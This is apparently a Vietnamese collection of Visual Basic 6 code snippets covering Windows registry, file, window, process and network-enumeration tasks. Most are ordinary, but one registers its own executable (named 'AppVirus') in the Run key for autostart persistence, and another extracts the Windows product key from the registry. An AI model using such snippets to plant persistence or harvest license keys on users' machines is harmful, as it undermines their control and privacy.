    RegSetValueEx Ret, strValue, 0, REG_SZ, ByVal strData, Len(strData)
    RegCloseKey Ret
End Sub

Private Sub DelSetting(hKey As Long, strPath As String, strValue As String)
    Dim Ret
    RegCreateKey hKey, strPath, Ret
    RegDeleteValue Ret, strValue
    RegCloseKey Ret
End Sub

Private Sub Form_Load()

    If Len(App.Path) &lt;&gt; 3 Then
        AppVirus = App.Path + "\" + App.EXEName + (".exe")
    Else
        AppVirus = App.Path + App.EXEName + (".exe")
    End If
    
    'Thêm khởi động cùng Windows
    SaveString HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", "DungCoi", AppVirus
End Sub

Private Sub Form_Unload(Cancel As Integer)
    'Gở khởi động cùng Windows
    DelSetting HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run", "DungCoi"
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>075312055315</MaVD>
    <NoiDung>Function MoKhoa(File)
    A = FreeFile
    Open File For Binary As #A
    B$ = Chr(0)
    Put #A, 17, B$
    Close #A
End Function

Function KhoaAnh(File)
    A = FreeFile
    Open File For Binary As #A
    B$ = "X"
    Put #A, 17, B$
    Close #A
End Function

Private Sub Command1_Click()
    KhoaAnh ("c:\Skin.bmp")
End Sub

Private Sub Command2_Click()
    MoKhoa ("c:\Skin.bmp")
End Sub

Private Sub Form_Load()
    Command1.Caption = " Khoa file anh"
    Command2.Caption = " Mo khoa file anh"
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0604240000000219</MaVD>
    <NoiDung>Private Sub Text1_KeyPress(KeyAscii As Integer)
    If IsNumeric(Chr(KeyAscii)) &lt;&gt; True Then KeyAscii = 0
End Sub

'Hoặc chấp nhận số thập phân:

Private Sub Text1_KeyPress(KeyAscii As Integer)
Dim Tmp As String
Tmp = Text1.Text
Select Case Chr$(KeyAscii)
Case "0" To "9", Chr$(8)
Case "-"
  If InStr(1, Tmp, "-") = 0 Then
    If Text1.SelStart &gt; 0 Then
      KeyAscii = 0
    End If
  Else
    KeyAscii = 0
  End If
Case "."
  If InStr(1, Tmp, ".") &gt; 0 Then
    KeyAscii = 0
  End If
Case Else
  KeyAscii = 0
End Select
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>070912060945</MaVD>
    <NoiDung>Public Function Dat_Thong_Diep(DuongDan As String, ThongDiep As String) As String
    Open DuongDan For Binary As #1
    Dim BoDem As String
    BoDem = Space(LOF(1))
    Get #1, , BoDem
    Close #1
    Dim Message As String
    Open DuongDan For Binary As #2
    Message = BoDem &amp; ThongDiep &amp; Chr(Len(ThongDiep))
    Put #2, , Message
End Function

Public Function Lay_Thong_Diep(DuongDan As String) As String
    Open DuongDan For Binary As #1
    Dim BoDem As String
    BoDem = Space(LOF(1))
    Get #1, , BoDem
    Close #1
    Dim Message As String
    Dim LuuC As String
    LuuC = Right(BoDem, 1)
    Message = Right(BoDem, Asc(LuuC) + 1)
    Message = Left(Message, Len(Message) - 1)
    Lay_Thong_Diep = Message
End Function

Private Sub CmdEncrypt_Click()
    If txtPath &lt;&gt; "" And txtContains &lt;&gt; "" Then Dat_Thong_Diep Trim$(txtPath), Trim$(txtContains)
End Sub

Private Sub CmdDecrypt_Click()
    txtContains = ""
    If txtPath &lt;&gt; "" Then txtContains = Lay_Thong_Diep(Trim$(txtPath))
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>0605182336510358</MaVD>
    <NoiDung>Public Sub RunCTPLApplet(strTenApplet As String)
    Shell "RunDLL32.EXE Shell32.DLL, Control_RunDLL " &amp; strTenApplet
End Sub

Private Sub Command1_Click()
    RunCTPLApplet "TimeDate.CPL" 'TimeDate
    'RunCTPLApplet "Desk.CPL" 'Display
    'RunCTPLApplet "AppWiz.CPL" 'Add or Remove programs
    'RunCTPLApplet "Main.CPL" 'Mouse properties
End Sub

'------------------- Tham khảo thêm -----------------
'Hộp thoại System Properties
Dim dblReturn As Double
dblReturn = Shell("rundll32.exe shell32.dll,Control_RunDLL sysdm.cpl @1", 5)
‘Hộp thoại Add/Remove Programs
Dim dblReturn As Double
dblReturn = Shell("rundll32.exe shell32.dll,Control_RunDLL appwiz.cpl,,1", 5)
' Hộp thoại Date/Time Properties
Dim dblReturn As Double
dblReturn = Shell("rundll32.exe shell32.dll,Control_RunDLL timedate.cpl", 5)
' Hộp thoại Display Properties
Dim dblReturn As Double
dblReturn = Shell("rundll32.exe shell32.dll,Control_RunDLL desk.cpl,,0", 5)
' Hộp thoại Game Controllers
Dim dblReturn As Double
dblReturn = Shell("rundll32.exe shell32.dll,Control_RunDLL joy.cpl", 5)
' Hộp thoại Internet Properties
Dim dblReturn As Double
dblReturn = Shell("rundll32.exe shell32.dll,Control_RunDLL inetcpl.cpl,,0", 5)
' Hộp thoại Keyboard Properties 
Dim dblReturn As Double
dblReturn = Shell("rundll32.exe shell32.dll,Control_RunDLL main.cpl @1", 5)
' Hộp thoại Modem Properties 
Dim dblReturn As Double
dblReturn = Shell("rundll32.exe shell32.dll,Control_RunDLL modem.cpl", 5)
' Hộp thoại Mouse Properties 
Dim dblReturn As Double
dblReturn = Shell("rundll32.exe shell32.dll,Control_RunDLL main.cpl @0", 5)
' Hộp thoại Multimedia Properties 
Dim dblReturn As Double
dblReturn = Shell("rundll32.exe shell32.dll,Control_RunDLL mmsys.cpl,,0", 5)
' Hộp thoại Network 
Dim dblReturn As Double
dblReturn = Shell("rundll32.exe shell32.dll,Control_RunDLL netcpl.cpl", 5)
' Hộp thoại Regional Settings 
Dim dblReturn As Double
dblReturn = Shell("rundll32.exe shell32.dll,Control_RunDLL intl.cpl,,0", 5)
' Hộp thoại Sounds Properties 
Dim dblReturn As Double
dblReturn = Shell("rundll32.exe shell32.dll,Control_RunDLL mmsys.cpl @1", 5)</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>073412063446</MaVD>
    <NoiDung>Public Function Encode(Data As String, Optional Depth As Integer) As String
Dim TempChar As String
Dim TempAsc As Integer
Dim NewData As String
Dim vChar As Integer

For vChar = 1 To Len(Data)
    TempChar = Mid$(Data, vChar, 1)
        TempAsc = Asc(TempChar)
        If Depth = 0 Then Depth = 40
        If Depth &gt; 254 Then Depth = 254

        TempAsc = TempAsc + Depth
        If TempAsc &gt; 255 Then TempAsc = TempAsc - 255
        TempChar = Chr(TempAsc)
        NewData = NewData &amp; TempChar
Next vChar
Encode = NewData

End Function
Public Function Decode(Data As String, Optional Depth As Integer) As String
Dim TempChar As String
Dim TempAsc As Integer
Dim NewData As String
Dim vChar As Integer

For vChar = 1 To Len(Data)
    TempChar = Mid$(Data, vChar, 1)
        TempAsc = Asc(TempChar)
        If Depth = 0 Then Depth = 40
        If Depth &gt; 254 Then Depth = 254
    TempAsc = TempAsc - Depth
        If TempAsc &lt; 0 Then TempAsc = TempAsc + 255
        TempChar = Chr(TempAsc)
        NewData = NewData &amp; TempChar
Next vChar
Decode = NewData

End Function
Private Sub CmdEncode_Click()
TxtKetqua.Text = Encode(txtDulieu.Text, 9)
End Sub
Private Sub cmdDecode_Click()
txtGiaiMa.Text = Decode(TxtKetqua.Text, 9)
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>075112065116</MaVD>
    <NoiDung>Private Sub Command1_Click()
    A = "."
    Open "c:\test_file.exe" For Binary As #1
    Seek #1, 25
    Put #1, , A
    Close #1
    MsgBox "The File, ''" &amp; "c:\test_file.exe" &amp; "'', Was Protected from being decompiled!", vbOKOnly, "Decompile Protection Attempt Successful!"
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>075612065646</MaVD>
    <NoiDung>Private Declare Function GetDriveType Lib "kernel32" Alias "GetDriveTypeA" (ByVal nDrive As String) As Long

Public Function Drive_Type(DriveLetter As Variant) As Long
    Dim strDL As String
    strDL = Left$(DriveLetter, 1) + ":\"
    Drive_Type = GetDriveType(strDL)
End Function

Private Sub Command1_Click()
    'Lấy type của ổ C
    MsgBox Drive_Type("C")
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>075912065949</MaVD>
    <NoiDung>Option Explicit

Private Declare Function RegCloseKey Lib "advapi32.dll" (ByVal hKey As Long) As Long
Private Declare Function RegOpenKey Lib "advapi32.dll" Alias "RegOpenKeyA" (ByVal hKey As Long, ByVal lpSubKey As String, phkResult As Long) As Long
Private Declare Function RegQueryValueEx Lib "advapi32.dll" Alias "RegQueryValueExA" (ByVal hKey As Long, ByVal lpValueName As String, ByVal lpReserved As Long, lpType As Long, lpData As Any, lpcbData As Long) As Long

Private Const REG_BINARY = 3
Private Const HKEY_LOCAL_MACHINE = &amp;H80000002
Private Const ERROR_SUCCESS = 0&amp;
    
Public Function sGetXPCDKey() As String

    'HKLM\SOFTWARE\MICROSOFT\Windows NT\Curr
    '     entVersion\DigitalProductId
    Dim bDigitalProductID() As Byte
    Dim bProductKey() As Byte
    Dim ilByte As Long
    Dim lDataLen As Long
    Dim hKey As Long

    If RegOpenKey(HKEY_LOCAL_MACHINE, "SOFTWARE\MICROSOFT\Windows NT\CurrentVersion", hKey) = ERROR_SUCCESS Then
        lDataLen = 164
        ReDim Preserve bDigitalProductID(lDataLen)

        If RegQueryValueEx(hKey, "DigitalProductId", 0&amp;, REG_BINARY, bDigitalProductID(0), lDataLen) = ERROR_SUCCESS Then

            ReDim Preserve bProductKey(14)


            For ilByte = 52 To 66
                bProductKey(ilByte - 52) = bDigitalProductID(ilByte)
            Next ilByte

        Else

            sGetXPCDKey = ""
            Exit Function
        End If

    Else
        '     CROSOFT\Windows NT\CurrentVersion"
        sGetXPCDKey = ""
        Exit Function
    End If

    Dim bKeyChars(0 To 24) As Byte
    'Giai ma CD key :
    bKeyChars(0) = Asc("B")
    bKeyChars(1) = Asc("C")
    bKeyChars(2) = Asc("D")
    bKeyChars(3) = Asc("F")
    bKeyChars(4) = Asc("G")
    bKeyChars(5) = Asc("H")
    bKeyChars(6) = Asc("J")
    bKeyChars(7) = Asc("K")
    bKeyChars(8) = Asc("M")
    bKeyChars(9) = Asc("P")
    bKeyChars(10) = Asc("Q")
    bKeyChars(11) = Asc("R")
    bKeyChars(12) = Asc("T")
    bKeyChars(13) = Asc("V")
    bKeyChars(14) = Asc("W")
    bKeyChars(15) = Asc("X")
    bKeyChars(16) = Asc("Y")
    bKeyChars(17) = Asc("2")
    bKeyChars(18) = Asc("3")
    bKeyChars(19) = Asc("4")
    bKeyChars(20) = Asc("6")
    bKeyChars(21) = Asc("7")
    bKeyChars(22) = Asc("8")
    bKeyChars(23) = Asc("9")
    Dim nCur As Integer
    Dim sCDKey As String
    Dim ilKeyByte As Long
    Dim ilBit As Long


    For ilByte = 24 To 0 Step -1

        nCur = 0


        For ilKeyByte = 14 To 0 Step -1

            nCur = nCur * 256 Xor bProductKey(ilKeyByte)
            bProductKey(ilKeyByte) = Int(nCur / 24)
            nCur = nCur Mod 24
        Next ilKeyByte

        sCDKey = Chr(bKeyChars(nCur)) &amp; sCDKey
        If ilByte Mod 5 = 0 And ilByte &lt;&gt; 0 Then sCDKey = "-" &amp; sCDKey
    Next ilByte

    sGetXPCDKey = sCDKey
End Function

Private Sub Command1_Click()
    MsgBox sGetXPCDKey
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>070212070238</MaVD>
    <NoiDung>Private Type POINTAPI
    X As Long
    Y As Long
End Type

Private Declare Function ClientToScreen Lib "user32" (ByVal hwnd As Long, lpPoint As POINTAPI) As Long
Private Declare Function SetCursorPos Lib "user32.dll" (ByVal X As Long, ByVal Y As Long) As Long

Private Sub MoveMouse(X As Single, Y As Single)
    Dim pt As POINTAPI
    pt.X = X
    pt.Y = Y
    ClientToScreen Form1.hwnd, pt
    SetCursorPos pt.X, pt.Y
End Sub

Private Sub Form_Load()
    MoveMouse 500, 400
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>070712070741</MaVD>
    <NoiDung>Private Type POINTAPI
    X As Long
    Y As Long
End Type

Private Type RECT
    Left As Long
    Top As Long
    Right As Long
    Bottom As Long
End Type
    
Private Declare Function GetCursorPos Lib "user32" (lpPoint As POINTAPI) As Long
Private Declare Function WindowFromPoint Lib "user32" (ByVal xPoint As Long, ByVal yPoint As Long) As Long
Private Declare Function GetWindowRect Lib "user32" (ByVal hwnd As Long, lpRect As RECT) As Long
Private Declare Function GetWindowDC Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function ReleaseDC Lib "user32" (ByVal hwnd As Long, ByVal hdc As Long) As Long
Private Declare Function CreatePen Lib "gdi32" (ByVal nPenStyle As Long, ByVal nWidth As Long, ByVal crColor As Long) As Long
Private Declare Function SelectObject Lib "gdi32" (ByVal hdc As Long, ByVal hObject As Long) As Long
Private Declare Function GetStockObject Lib "gdi32" (ByVal nIndex As Long) As Long
Private Declare Function SetROP2 Lib "gdi32" (ByVal hdc As Long, ByVal nDrawMode As Long) As Long
Private Declare Function DeleteObject Lib "gdi32" (ByVal hObject As Long) As Long
Private Declare Function Rectangle Lib "gdi32" (ByVal hdc As Long, ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Private Declare Function SetCapture Lib "user32" (ByVal hwnd As Long) As Long
Private Declare Function ReleaseCapture Lib "user32" () As Long
Private Declare Function CreateRectRgn Lib "gdi32" (ByVal X1 As Long, ByVal Y1 As Long, ByVal X2 As Long, ByVal Y2 As Long) As Long
Private Declare Function SelectClipRgn Lib "gdi32" (ByVal hdc As Long, ByVal hRgn As Long) As Long
Private Declare Function GetClipRgn Lib "gdi32" (ByVal hdc As Long, ByVal hRgn As Long) As Long

Private Const NULL_BRUSH = 5
Private Selecting As Boolean
Private BorderDrawn As Boolean
Private Myhwnd As Long

Private Sub Command1_Click()
    Draw
End Sub

Private Sub Form_MouseDown(Button As Integer, Shift As Integer, X As Single, Y As Single)
    Selecting = True
    SetCapture Me.hwnd
    Form_MouseMove 0, Shift, X, Y
End Sub

Private Sub Form_MouseMove(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Selecting = False Then Exit Sub
    Draw
End Sub

Private Sub Form_MouseUp(Button As Integer, Shift As Integer, X As Single, Y As Single)
    If Selecting = False Then Exit Sub
    UnDraw
    ReleaseCapture
    Selecting = False
    Myhwnd = 0
End Sub

Private Sub Draw()
    Dim Cursor As POINTAPI
    Dim RetVal As Long
    Dim hdc As Long
    Dim Pen As Long
    Dim Brush As Long
    Dim OldPen As Long
    Dim OldBrush As Long
    Dim OldROP As Long
    Dim Region As Long
    Dim OldRegion As Long
    Dim FullWind As RECT
    Dim Draw As RECT
    GetCursorPos Cursor
    RetVal = WindowFromPoint(Cursor.X, Cursor.Y)
    If RetVal = Myhwnd Then Exit Sub
    If BorderDrawn = True Then UnDraw
    BorderDrawn = True
    Myhwnd = RetVal
    Me.Cls
    Me.Print Hex(Myhwnd)
    GetWindowRect Myhwnd, FullWind
    Region = CreateRectRgn(0, 0, FullWind.Right - FullWind.Left, FullWind.Bottom - FullWind.Top)
    hdc = GetWindowDC(Myhwnd)
    RetVal = GetClipRgn(hdc, OldRegion)
    RetVal = SelectObject(hdc, Region)
    Pen = CreatePen(DrawStyleConstants.vbSolid, 6, 0)
    OldPen = SelectObject(hdc, Pen)
    Brush = GetStockObject(NULL_BRUSH)
    OldBrush = SelectObject(hdc, Brush)
    OldROP = SetROP2(hdc, DrawModeConstants.vbInvert)
    With Draw
        .Left = 0
        .Top = 0
        .Bottom = FullWind.Bottom - FullWind.Top
        .Right = FullWind.Right - FullWind.Left
        Rectangle hdc, .Left, .Top, .Right, .Bottom
    End With
    SelectObject hdc, OldRegion
    SetROP2 hdc, OldROP
    SelectObject hdc, OldBrush
    SelectObject hdc, OldPen
    DeleteObject Brush
    DeleteObject Pen
    DeleteObject Region
    ReleaseDC Myhwnd, hdc
End Sub

Private Sub UnDraw()
    If BorderDrawn = False Then Exit Sub
    BorderDrawn = False
    If Myhwnd = 0 Then Exit Sub
    Dim Cursor As POINTAPI
    Dim RetVal As Long
    Dim hdc As Long
    Dim Pen As Long
    Dim Brush As Long
    Dim OldPen As Long
    Dim OldBrush As Long
    Dim OldROP As Long
    Dim Region As Long
    Dim OldRegion As Long
    Dim FullWind As RECT
    Dim Draw As RECT
    GetWindowRect Myhwnd, FullWind
    Region = CreateRectRgn(0, 0, FullWind.Right - FullWind.Left, FullWind.Bottom - FullWind.Top)
    hdc = GetWindowDC(Myhwnd)
    RetVal = GetClipRgn(hdc, OldRegion)
    RetVal = SelectObject(hdc, Region)
    Pen = CreatePen(DrawStyleConstants.vbSolid, 6, 0) ' Draw Solid lines, width 6, and color black
    OldPen = SelectObject(hdc, Pen)
    Brush = GetStockObject(NULL_BRUSH)
    OldBrush = SelectObject(hdc, Brush)
    OldROP = SetROP2(hdc, DrawModeConstants.vbInvert) ' vbInvert means, whatever is draw,
    With Draw
        .Left = 0
        .Top = 0
        .Bottom = FullWind.Bottom - FullWind.Top
        .Right = FullWind.Right - FullWind.Left
        Rectangle hdc, .Left, .Top, .Right, .Bottom ' Really easy to understand - draw a rectangle, hDC, and coordinates
    End With
    SelectObject hdc, OldRegion
    SetROP2 hdc, OldROP
    SelectObject hdc, OldBrush
    SelectObject hdc, OldPen
    DeleteObject Brush
    DeleteObject Pen
    DeleteObject Region
    ReleaseDC Myhwnd, hdc
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>071512071524</MaVD>
    <NoiDung>Option Explicit
Private Const ULW_COLORKEY = &amp;H1
Private Const GWL_STYLE = (-16)
Private Const GWL_EXSTYLE = (-20)
Private Const WS_EX_LAYERED = &amp;H80000
Private Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
Private Declare Function GetWindowLong Lib "user32" Alias "GetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long) As Long
Private Declare Function SetLayeredWindowAttributes Lib "user32.dll" (ByVal hwnd As Long, ByVal crKey As Long, ByVal bAlpha As Byte, ByVal dwFlags As Long) As Long
Dim Trans As Boolean
Dim OldStyle As Long

Private Sub Form_Load()
  Transparent (True)
End Sub

Private Sub Transparent(t As Boolean)
  Trans = Not Trans
  If t Then
      Me.BackColor = &amp;HFFCCCC
      SetWindowLong Me.hwnd, GWL_EXSTYLE, WS_EX_LAYERED
      SetLayeredWindowAttributes Me.hwnd, &amp;HFFCCCC, 0, ULW_COLORKEY
  Else
      Me.BackColor = &amp;H8000000F
      SetWindowLong Me.hwnd, GWL_EXSTYLE, OldStyle
  End If
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>073012073048</MaVD>
    <NoiDung>'--------- Copy code sau vào Class
Option Explicit
Dim PCLIST As String 'buffer to hold pc's names
Private Type NETRESOURCE
   dwScope As Long
   dwType As Long
   dwDisplayType As Long
   dwUsage As Long
   lpLocalName As Long
   lpRemoteName As Long
   lpComment As Long
   lpProvider As Long
End Type

Private Declare Function WNetOpenEnum Lib "mpr.dll" Alias _
  "WNetOpenEnumA" (ByVal dwScope As Long, ByVal dwType As Long, _
  ByVal dwUsage As Long, lpNetResource As Any, lphEnum As Long) As Long

Private Declare Function WNetEnumResource Lib "mpr.dll" Alias _
  "WNetEnumResourceA" (ByVal hEnum As Long, lpcCount As Long, _
  ByVal lpBuffer As Long, lpBufferSize As Long) As Long

Private Declare Function WNetCloseEnum Lib "mpr.dll" _
   (ByVal hEnum As Long) As Long

Private Const RESOURCE_CONNECTED = &amp;H1
Private Const RESOURCE_GLOBALNET = &amp;H2
Private Const RESOURCE_REMEMBERED = &amp;H3

Private Const RESOURCETYPE_ANY = &amp;H0
Private Const RESOURCETYPE_DISK = &amp;H1
Private Const RESOURCETYPE_PRINT = &amp;H2
Private Const RESOURCETYPE_UNKNOWN = &amp;HFFFF

Private Const RESOURCEUSAGE_CONNECTABLE = &amp;H1
Private Const RESOURCEUSAGE_CONTAINER = &amp;H2
Private Const RESOURCEUSAGE_RESERVED = &amp;H80000000

Private Const GMEM_FIXED = &amp;H0
Private Const GMEM_ZEROINIT = &amp;H40
Private Const GPTR = (GMEM_FIXED Or GMEM_ZEROINIT)

Private Declare Function GlobalAlloc Lib "kernel32" _
  (ByVal wFlags As Long, ByVal dwBytes As Long) As Long

Private Declare Function GlobalFree Lib "kernel32" _
  (ByVal hMem As Long) As Long

Private Declare Sub CopyMemory Lib "kernel32" Alias _
  "RtlMoveMemory" (hpvDest As Any, hpvSource As Any, _
   ByVal cbCopy As Long)
   
Private Declare Function CopyPointer2String Lib _
  "kernel32" Alias "lstrcpyA" (ByVal NewString As _
  String, ByVal OldString As Long) As Long

Private Function DoNetEnum()
    Dim hEnum As Long, lpBuff As Long, NR As NETRESOURCE
    Dim cbBuff As Long, cCount As Long
    Dim P As Long, res As Long, i As Long
    
    On Error Resume Next
    If Err.Number &gt; 0 Then Exit Function
    
    On Error GoTo ErrorHandler
    
    NR.lpRemoteName = 0
    
    cbBuff = 1024 * 31
    cCount = &amp;HFFFFFFFF
    
    res = WNetOpenEnum(RESOURCE_GLOBALNET, RESOURCETYPE_ANY, 0, NR, hEnum)

    If res = 0 Then
    
       lpBuff = GlobalAlloc(GPTR, cbBuff)
    
       res = WNetEnumResource(hEnum, cCount, lpBuff, cbBuff)
       If res = 0 Then
          P = lpBuff
          For i = 1 To cCount
             CopyMemory NR, ByVal P, LenB(NR)
             'list.AddItem PointerToString(NR.lpRemoteName)
             DoNetEnum2 NR
             P = P + LenB(NR)
          Next i
        End If
    
ErrorHandler:
    On Error Resume Next
       If lpBuff &lt;&gt; 0 Then GlobalFree (lpBuff)
       WNetCloseEnum (hEnum)
    
    End If
End Function

Private Function PointerToString(P As Long) As String
   Dim s As String
   s = String(65535, Chr$(0))
   CopyPointer2String s, P
   PointerToString = Left(s, InStr(s, Chr$(0)) - 1)
End Function

Private Sub DoNetEnum2(NR As NETRESOURCE)
   Dim hEnum As Long, lpBuff As Long
   Dim cbBuff As Long, cCount As Long
   Dim P As Long, res As Long, i As Long

   cbBuff = 1024 * 31
   cCount = &amp;HFFFFFFFF

   res = WNetOpenEnum(RESOURCE_GLOBALNET, _
     RESOURCETYPE_ANY, 0, NR, hEnum)
   If res = 0 Then

      lpBuff = GlobalAlloc(GPTR, cbBuff)
      res = WNetEnumResource(hEnum, cCount, lpBuff, cbBuff)
      If res = 0 Then
         P = lpBuff
         For i = 1 To cCount
            CopyMemory NR, ByVal P, LenB(NR)
            Dim st As String
            Select Case NR.dwDisplayType
                Case &amp;H1
                    st = "Domain"
                Case &amp;H2
                    st = "Server"
                Case &amp;H3
                    st = "Share"
                Case &amp;H4
                    st = "File"
                Case &amp;H5
                    st = "Groups"
                Case &amp;H6
                    st = "Protocol Categories"
            End Select
            If LCase(st) &lt;&gt; "domain" Then
            PCLIST = PCLIST &amp; "||" &amp; Replace(PointerToString(NR.lpRemoteName), "\", "") '&amp; " is  a : " &amp; st
            End If
            DoEvents
            If Not NR.dwDisplayType = 2 Then DoNetEnum2 NR
            P = P + LenB(NR)
         Next i
      End If

      If lpBuff &lt;&gt; 0 Then GlobalFree (lpBuff)
      WNetCloseEnum (hEnum)

   End If
PCLIST = stripDelimiter(PCLIST)
End Sub

Property Get GetPCList() As String
    GetPCList = PCLIST
End Property

Private Function stripDelimiter(ByVal s As String) As String
    If Left(s, 2) = "||" Then s = Right(s, Len(s) - 2)
    stripDelimiter = s
End Function

Private Sub Class_Initialize()
    DoNetEnum
End Sub

'----------- Copy code sau vào Form
Private Sub Form_Load()
    Dim LANScan As New Class1
    Dim s() As String
    Dim i
    s = Split(LANScan.GetPCList, "||")
    For i = LBound(s) To UBound(s)
        List1.AddItem s(i)
    Next
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>073512073540</MaVD>
    <NoiDung>Private Declare Function InternetGetConnectedStateEx Lib "wininet.dll" (ByRef lpdwFlags As Long, ByVal lpszConnectionName As String, ByVal dwNameLen As Integer, ByVal dwReserved As Long) As Long
Dim sConnType As String * 255

Private Sub Form_Load()
    Dim Ret As Long
    Ret = InternetGetConnectedStateEx(Ret, sConnType, 254, 0)
    If Ret = 1 Then
        MsgBox "Ban da ket noi Internet " &amp; sConnType, vbInformation
    Else
        MsgBox "Ban chua ket noi internet", vbInformation
    End If
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>074112074128</MaVD>
    <NoiDung>'============================================
'Author: Joe Wong (Come from China)
'ICQ NO:7601450
'PLS VOTE FOR ME AND GIVE ME COMMENTS,thanks!
'==========================================

Private Declare Function CreateToolhelpSnapshot Lib "kernel32" _
      Alias "CreateToolhelp32Snapshot" ( _
      ByVal lFlags As Long, _
      ByVal lProcessID As Long) As Long
Private Declare Function ProcessFirst Lib "kernel32" _
      Alias "Process32First" ( _
      ByVal hSnapShot As Long, _
      uProcess As PROCESSENTRY32) As Long
Private Declare Function ProcessNext Lib "kernel32" _
      Alias "Process32Next" ( _
      ByVal hSnapShot As Long, _
      uProcess As PROCESSENTRY32) As Long
Private Declare Function TerminateProcess Lib "kernel32" ( _
      ByVal hProcess As Long, _
      ByVal uExitCode As Long) As Long
Private Declare Function OpenProcess Lib "kernel32" ( _
      ByVal dwDesiredAccess As Long, _
      ByVal bInheritHandle As Long, _
      ByVal dwProcessId As Long) As Long
Private Declare Function CloseHandle Lib "kernel32" (ByVal hObject As Long) As Long

Private Const TH32CS_SNAPPROCESS = &amp;H2
Private Const TH32CS_SNAPheaplist = &amp;H1
Private Const TH32CS_SNAPthread = &amp;H4
Private Const TH32CS_SNAPmodule = &amp;H8
Private Const TH32CS_SNAPall = TH32CS_SNAPPROCESS + TH32CS_SNAPheaplist + TH32CS_SNAPthread + _
   TH32CS_SNAPmodule
Private Const MAX_PATH As Integer = 260

'define PROCESSENTRY32 structure

Private Type PROCESSENTRY32
   dwSize As Long
   cntUsage As Long
   th32ProcessID As Long
   th32DefaultHeapID As Long
   th32ModuleID As Long
   cntThreads As Long
   th32ParentProcessID As Long
   pcPriClassBase As Long
   dwFlags As Long
   szExeFile As String * MAX_PATH
End Type

Private Sub Form_Load()
    Dim i
    Dim theloop As Long
    Dim proc As PROCESSENTRY32
    Dim snap As Long
    Dim exename As String
    
     List1.Clear
     snap = CreateToolhelpSnapshot(TH32CS_SNAPall, 0) 'get snapshot handle
     proc.dwSize = Len(proc)
     theloop = ProcessFirst(snap, proc)       'first process and return value
     i = 0
    
     While theloop &lt;&gt; 0      'next process
        exename = proc.szExeFile
        List1.AddItem exename     'add process name to listview
        i = i + 1
        theloop = ProcessNext(snap, proc)
     Wend
    
     CloseHandle snap       'close snapshot handle
End Sub</NoiDung>
  </Vidu>
  <Vidu>
    <MaVD>074812074846</MaVD>
    <NoiDung>'--------Trong Module
Option Explicit
Private Declare Function GetCurrentThreadId Lib "kernel32" () As Long
Private Declare Function SetWindowsHookEx Lib "user32" Alias "SetWindowsHookExA" (ByVal idHook As Long, ByVal lpfn As Long, ByVal hmod As Long, ByVal dwThreadId As Long) As Long
Private Declare Function UnhookWindowsHookEx Lib "user32" (ByVal hHook As Long) As Long
Private Declare Function FindWindowEx Lib "user32.dll" Alias "FindWindowExA" (ByVal hwndParent As Long, ByVal hwndChildAfter As Long, ByVal lpszClass As String, ByVal lpszWindow As String) As Long
Private Declare Function SetWindowText Lib "user32.dll" Alias "SetWindowTextA" (ByVal HWND As Long, ByVal lpString As String) As Long
Private Declare Function GetClassName Lib "user32.dll" Alias "GetClassNameA" (ByVal HWND As Long, ByVal lpClassName As String, ByVal nMaxCount As Long) As Long
Private Declare Function SendMessage Lib "user32.dll" Alias "SendMessageA" (ByVal HWND As Long, ByVal wMsg As Long, ByVal wParam As Long, lParam As Any) As Long
Private Const HCBT_ACTIVATE = 5
Private Const WH_CBT = 5
Private hHook As Long, ButtonText(3) As String, PasswordChar As Byte
    
Private Function ChangeButtonsText(ByVal lMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
    Dim t As Integer, cName As String, Length As Long, Btn(0 To 3) As Long
    If lMsg = HCBT_ACTIVATE Then
        Btn(0) = FindWindowEx(wParam, 0, vbNullString, vbNullString)
        For t = 1 To 3
            Btn(t) = FindWindowEx(wParam, Btn(t - 1), vbNullString, vbNullString)
            If Btn(t) = 0 Then Exit For
        Next t
        For t = 0 To 3
            If (Btn(t) &lt;&gt; 0) And (Btn(t) &lt;&gt; wParam) Then
                cName = Space(255)
                Length = GetClassName(Btn(t), cName, 255)
                cName = Left(cName, Length)
                If UCase(cName) = "BUTTON" Then
                    If ButtonText(t) &lt;&gt; vbNullString Then SetWindowText Btn(t), ButtonText(t)
                End If
            End If
        Next t
        UnhookWindowsHookEx hHook
    End If
    ChangeButtonsText = False
End Function

Private Function SetPasswordChar(ByVal lMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
    Const EM_SETPASSWORDCHAR As Long = &amp;HCC
    Dim t As Integer, cName As String, Length As Long, Btn(0 To 3) As Long
    If lMsg = HCBT_ACTIVATE Then
        Btn(0) = FindWindowEx(wParam, 0, vbNullString, vbNullString)
        For t = 1 To 3
            Btn(t) = FindWindowEx(wParam, Btn(t - 1), vbNullString, vbNullString)
            If Btn(t) = 0 Then Exit For
        Next t
        For t = 0 To 3
            If (Btn(t) &lt;&gt; 0) And (Btn(t) &lt;&gt; wParam) Then
                cName = Space(255)
                Length = GetClassName(Btn(t), cName, 255)
                cName = Left(cName, Length)
                If LCase$(cName) = "edit" Then SendMessage Btn(t), EM_SETPASSWORDCHAR, ByVal PasswordChar, ByVal 0&amp;
            End If
        Next t
        UnhookWindowsHookEx hHook
    End If
    SetPasswordChar = False
End Function

